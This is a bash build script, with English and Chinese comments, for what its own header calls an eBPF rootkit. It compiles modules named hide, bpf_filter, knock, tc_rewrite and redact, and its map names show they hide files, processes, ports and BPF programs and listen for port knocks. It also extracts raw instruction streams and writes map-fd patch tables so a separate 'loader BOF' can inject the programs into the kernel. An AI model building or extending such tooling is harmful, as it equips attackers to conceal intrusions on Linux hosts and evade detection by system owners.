#!/usr/bin/env bash
# build_bpf.sh — eBPF rootkit build pipeline (Phase 2)
#
# Usage: bash tools/build_bpf.sh [module|all] [arch]
#   module: hide | bpf_filter | knock | tc_rewrite
#   arch:   x86 | arm64  (default x86)
#
# Outputs (src_agent/bpf/out/):
#   <module>.o            — BPF object (BTF + CO-RE relocations)
#   <module>.insns.bin    — raw instruction stream of the program's own section
#   <module>.mapreloc.txt — map-fd patch table for that stream
#   <module>.attach.txt   — {prog_type, attach, target} the loader must use
#
# Toolchain: clang -target bpf + bpftool (sanity) + llvm-objcopy/readelf
#
# ---------------------------------------------------------------------------
# FOUR NOTES ON THE PIPELINE (all verified against the built objects)
# ---------------------------------------------------------------------------
# 1. THE -D__VMLINUX_H__ FLAG IS GONE.  vmlinux.h guards itself with
#    `#ifndef __VMLINUX_H__`, so passing -D__VMLINUX_H__ on the command line
#    defines that guard and the header expands to *nothing* — every __u32,
#    __u64 and struct disappears ("unknown type name '__u64'").  It was
#    removed here rather than worked around.  Each module also starts with
#    `#undef __VMLINUX_H__` before including common.h, so the flag can still
#    be passed by hand on the documented command line without breaking the
#    build.
#
# 2. A SEC()-attributed program does NOT live in .text — clang puts it in a
#    section named after the attach type ("xdp", "tracepoint/syscalls/...",
#    "kprobe/...").  .text only ever holds unattributed helpers (BPF-to-BPF
#    subprograms).  Extracting .text therefore yields an EMPTY stream for any
#    normal module, so the program's own section is selected instead.
#    Modules are deliberately written with no subprograms (every helper is
#    __always_inline) so that section is a complete, self-contained program:
#    a BPF-to-BPF call would be emitted as a displacement relative to a
#    different section's offset and would not survive being relocated alone.
#    One program per module, so one .insns.bin per module.
#
# 3. Map references are emitted as `18 01 00 00 00000000` (`ld_imm64 r1, 0`)
#    plus an R_BPF_64_64 relocation against the map symbol: measured on the
#    built objects, src_reg = 0 and imm = 0, i.e. the instruction is NOT
#    usable as-is and neither the fd nor the declaration index can be read out
#    of the stream.  <module>.mapreloc.txt therefore supplies
#    "<insn_index> <map_decl_index> <map_name>" for every map reference, where
#    insn_index is the index of the ld_imm64 instruction inside .insns.bin and
#    map_decl_index is the 0-based index of that map in common.h's declaration
#    order (the order the loader BOF creates the maps in).  The loader must
#    patch each such instruction: either src_reg = 1 (BPF_PSEUDO_MAP_FD) with
#    imm = the map's real fd, or src_reg = 5 (BPF_PSEUDO_MAP_IDX) with
#    imm = map_decl_index plus attr.fd_array.  Note the ld_imm64 occupies TWO
#    8-byte slots (insn_index and insn_index + 1); the second slot is the high
#    half of the immediate and stays 0.
#
#    map_decl_index comes from the fixed table below, NOT from the object's
#    own .maps section: clang emits .maps in per-module first-reference order
#    (measured: hide.o = declaration order, bpf_filter.o = hidden_bpf_ids
#    first, knock.o = knock_seen/knock_key/events first), so the object's
#    .maps index is module-dependent and would load the wrong map.
#
# 4. Program type.  BPF_PROG_TYPE_TRACEPOINT is 5; BPF_PROG_TYPE_XDP is 6;
#    BPF_PROG_TYPE_KPROBE is 2.  Do NOT load the tracepoint programs as type
#    26 — 26 is BPF_PROG_TYPE_TRACING (fentry/fexit), which needs a BTF
#    attach_btf_id and rejects a tracefs event path.  <module>.attach.txt
#    names the type and target each module needs.
# ---------------------------------------------------------------------------

set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
BPFDIR="$HERE/../src_agent/bpf"
INCLUDE="$BPFDIR/include"
# ★ ISS-082：允许调用方把产物写到别处（deploy.sh --check 要编到临时目录
#   再与 out/ 对拍）。不这么做的话，deploy.sh 就得把下面整条 clang 命令行
#   抄一遍 —— 那就是**下一条会漂移的轴**，正是本文件要消灭的东西。
OUT="${AX_BPF_OUT:-$BPFDIR/out}"

MODULE="${1:-all}"
ARCH="${2:-x86}"
if [ "$ARCH" = "arm64" ] || [ "$ARCH" = "aarch64" ]; then
    TARGET_ARCH="arm64"
else
    TARGET_ARCH="x86"
fi

mkdir -p "$OUT"

# Name of the SEC()-attributed program section (skips .text, .maps, license
# and every non-program section).
prog_section() {
    llvm-objdump -h "$1" 2>/dev/null | awk '
        $3 ~ /^[0-9a-f]+$/ && $3 != "0000000000000000" &&
        $2 !~ /^\.(rel|debug|BTF|strtab|symtab|llvm)/ &&
        $2 != ".text" && $2 != ".maps" && $2 != "license" { print $2; exit }'
}

# {prog_type, attach, target} for a section name.
attach_desc() {
    local sec="$1" name
    case "$sec" in
        xdp)
            echo "prog_type=6	# BPF_PROG_TYPE_XDP"
            echo "attach=xdp	# netlink XDP_SET / XDP_FLAGS_UPDATE_IF_NOEXIST"
            echo "target=<ifindex>"
            ;;
        tracepoint/*)
            name="${sec#tracepoint/}"
            echo "prog_type=5	# BPF_PROG_TYPE_TRACEPOINT (NOT 26 = BPF_PROG_TYPE_TRACING)"
            echo "attach=tracepoint	# perf_event_open on the event's id file"
            echo "target=/sys/kernel/tracing/events/$name/id"
            ;;
        kprobe/*|kretprobe/*)
            name="${sec#*/}"
            echo "prog_type=2	# BPF_PROG_TYPE_KPROBE"
            echo "attach=${sec%%/*}	# debugfs kprobe_events + perf_event_open + PERF_EVENT_IOC_SET_BPF"
            echo "target=$name"
            ;;
        *)
            echo "prog_type=?	# unmapped section '$sec'"
            echo "attach=?"
            echo "target=?"
            ;;
    esac
}

# Name -> index in common.h's declaration order.  This is the loader ABI (the
# BOF creates the maps in that order and passes the fd array), so the mapping
# is fixed here rather than derived from the object.
ax_map_index() {
    case "$1" in
        hide_names)     echo 0 ;;
        hidden_bpf_ids) echo 1 ;;
        knock_key)      echo 2 ;;
        knock_seen)     echo 3 ;;
        events)         echo 4 ;;
        hidden_ports)   echo 5 ;;
        redact_fds)     echo 7 ;;
        *)              echo -1 ;;
    esac
}

build_one() {
    local mod="$1"
    local src="$BPFDIR/$mod.c"
    [ -f "$src" ] || { echo "  [SKIP] $src not found"; return 1; }
    local obj="$OUT/$mod.o"
    if clang -target bpf -O2 -g -Wall -Werror \
        -D__TARGET_ARCH_${TARGET_ARCH} \
        -D__KERNEL__ \
        -I "$INCLUDE" -I "$BPFDIR" \
        -c "$src" -o "$obj"; then
        echo "  [PASS] compile $mod ($TARGET_ARCH)"
    else
        echo "  [FAIL] compile $mod"; return 1
    fi

    # Sanity: bpftool must parse the object (validates BTF/sections)
    if command -v bpftool >/dev/null 2>&1; then
        if bpftool gen skeleton "$obj" >/dev/null 2>&1; then
            echo "  [PASS] bpftool skeleton $mod"
        else
            echo "  [FAIL] bpftool skeleton $mod"; return 1
        fi
    fi

    # Raw instruction stream: the program's OWN section, not .text
    local sec
    sec="$(prog_section "$obj")"
    if [ -z "$sec" ]; then
        echo "  [FAIL] no program section in $mod"; return 1
    fi
    if llvm-objcopy -O binary --only-section="$sec" "$obj" "$OUT/$mod.insns.bin"; then
        local n
        n=$(stat -c%s "$OUT/$mod.insns.bin")
        if [ "$n" -eq 0 ]; then
            echo "  [FAIL] insns.bin $mod is empty (section '$sec')"; return 1
        fi
        echo "  [PASS] insns.bin $mod ($n bytes = $((n / 8)) insns, section '$sec')"
    else
        echo "  [FAIL] insns.bin $mod"; return 1
    fi

    {
        echo "module=$mod"
        echo "object=out/$mod.o"
        echo "section=$sec"
        attach_desc "$sec"
        echo "insns=out/$mod.insns.bin"
        echo "mapreloc=out/$mod.mapreloc.txt"
        echo "patch=for each line of mapreloc: insn[insn_index].src_reg=1, .imm=<map fd>"
        echo "patch_alt=src_reg=5 (BPF_PSEUDO_MAP_IDX) + imm=<map_decl_index> + attr.fd_array"
    } > "$OUT/$mod.attach.txt"

    # Map-fd patch table: every R_BPF_64_64 against a map symbol, as
    # "<insn_index> <map_decl_index> <map_name>", insn_index counting 8-byte
    # BPF instructions from the start of the extracted stream.
    if command -v llvm-readelf >/dev/null 2>&1; then
        llvm-readelf -r "$obj" 2>/dev/null | awk -v s="$sec" '
            /^Relocation section/ { insec = (index($0, s) > 0); next }
            insec && $3 == "R_BPF_64_64" { print $1, $5 }' \
            > "$OUT/$mod.relocs.tmp"
        : > "$OUT/$mod.mapreloc.txt"
        local bad=0
        while read -r off name; do
            local idx mi
            idx=$(( 16#$off / 8 ))
            mi=$(ax_map_index "$name")
            [ "$mi" = "-1" ] && bad=1
            printf '%d %s %s\n' "$idx" "$mi" "$name" >> "$OUT/$mod.mapreloc.txt"
        done < "$OUT/$mod.relocs.tmp"
        rm -f "$OUT/$mod.relocs.tmp"
        echo "  [PASS] mapreloc $mod ($(wc -l < "$OUT/$mod.mapreloc.txt") map refs)"
        if [ "$bad" = "1" ]; then
            echo "  [FAIL] $mod references a map outside common.h:" \
                 "$(awk '$2 == "-1" { print $3 }' "$OUT/$mod.mapreloc.txt" | tr '\n' ' ')"
            return 1
        fi
    fi

    # ── Verifier gate ────────────────────────────────────────────────────────
    # clang 只证明"能编译"，**不证明"能加载"**。变长偏移索引栈缓冲这类问题只有
    # verifier 会说话，而症状出现在目标机上（PROG_LOAD err=13），本地一路 PASS。
    # redact 就这么带着 "invalid variable-offset read from stack" 通过了编译门。
    verifier_check "$mod" "$sec" || return 1
    return 0
}

# Load the object through the kernel verifier with the same prog_type the loader
# will use. This is the only step that proves the program can actually be loaded;
# clang's PASS and bpftool-skeleton's PASS do not.
verifier_check() {
    local mod="$1" sec="$2" t="" pin log
    command -v bpftool >/dev/null 2>&1 || return 0
    case "$sec" in
        xdp)                    t=xdp ;;
        tracepoint/*)           t=tracepoint ;;
        kprobe/*|kretprobe/*)   t=kprobe ;;
        *)                      return 0 ;;
    esac
    pin="/sys/fs/bpf/axbv_$$"
    rm -f "$pin"
    if log=$(bpftool prog load "$OUT/$mod.o" "$pin" type "$t" 2>&1); then
        echo "  [PASS] verifier $mod (type=$t)"
    else
        echo "  [FAIL] verifier $mod (type=$t)"
        echo "$log" | grep -v '^libbpf: prog' | tail -12
        rm -f "$pin"
        return 1
    fi
    rm -f "$pin"
    return 0
}

# ── ★★ ISS-087：产物必须"要么全对、要么不动" ────────────────────────────────
# 上面 build_one 把 insns.bin / mapreloc.txt / attach.txt **直写** $OUT，而 out/
# 就是**运行期真正加载**的那个目录（ebpf_load.c 读 insns.bin、按 mapreloc patch
# map fd；deploy.sh:59 有同一句），可 verifier 门禁跑在**写盘之后**。于是"编译
# 过了、verifier 拒绝"的产物会**静默留在真源位置**：旧的好产物已被覆盖，而症状
# （PROG_LOAD err=13 / 台面报 "xx 加载失败"）与"功能真的坏了"**逐字节同形**。
# 实测代价：一次 verifier FAIL 让加载不了的 redact 在 out/ 里躺了约 10 分钟。
# 修法：开跑前快照、失败即整体还原。还原要**双向** —— 快照里有的覆盖回去，
# 快照里没有的（本次新造的坏产物）删掉，否则"新模块失败"仍会留残骸。
# ★ `.o` 也在快照/还原范围内。它**不是运行期产物**（运行期只读 insns.bin，
#   见 ebpf_load.c），但头注 "Outputs" 一节把它与另三类并列、build_one:144 也
#   直写 $OUT ⇒ 留着它就破坏"失败后 out/ 与开跑前逐字节相同"这条不变量，且下次
#   看见一个 .o 无法判断它出自"过门禁的那次"还是"被拒的那次" —— 与 ISS-087
#   本体是同一类混淆，低一层。
# AX_BPF_OUT 覆盖时跳过：deploy.sh 用它把产物编到临时目录再与 out/ 对拍字节，
# 那里本来就不落真源。
SNAP=""
if [ -z "${AX_BPF_OUT:-}" ]; then
    SNAP="$(mktemp -d "$OUT/.snap.XXXXXX" 2>/dev/null)" || SNAP=""
    if [ -n "$SNAP" ]; then
        cp -p "$OUT"/*.insns.bin "$OUT"/*.mapreloc.txt "$OUT"/*.attach.txt \
            "$OUT"/*.o "$SNAP/" 2>/dev/null || true
    fi
fi

FAIL=0
if [ "$MODULE" = "all" ]; then
    for m in hide bpf_filter knock tc_rewrite redact; do
        build_one "$m" || FAIL=1
    done
else
    build_one "$MODULE" || FAIL=1
fi

if [ -n "$SNAP" ]; then
    if [ "$FAIL" -eq 0 ]; then
        rm -rf "$SNAP"
    else
        echo "  → 有检查未通过：把 out/ 还原成**本次改动前**的产物（ISS-087）"
        for f in "$OUT"/*.insns.bin "$OUT"/*.mapreloc.txt "$OUT"/*.attach.txt \
                 "$OUT"/*.o; do
            [ -f "$f" ] || continue
            b="$SNAP/$(basename "$f")"
            if [ -f "$b" ]; then
                cp -p "$b" "$f" || true
            else
                rm -f "$f"            # 快照里没有 = 本次新造出来的 ⇒ 一并清掉
            fi
        done
        rm -rf "$SNAP"
    fi
fi

[ "$FAIL" -eq 0 ] && echo "BUILD_BPF: ALL PASS" || echo "BUILD_BPF: FAIL"
exit $FAIL
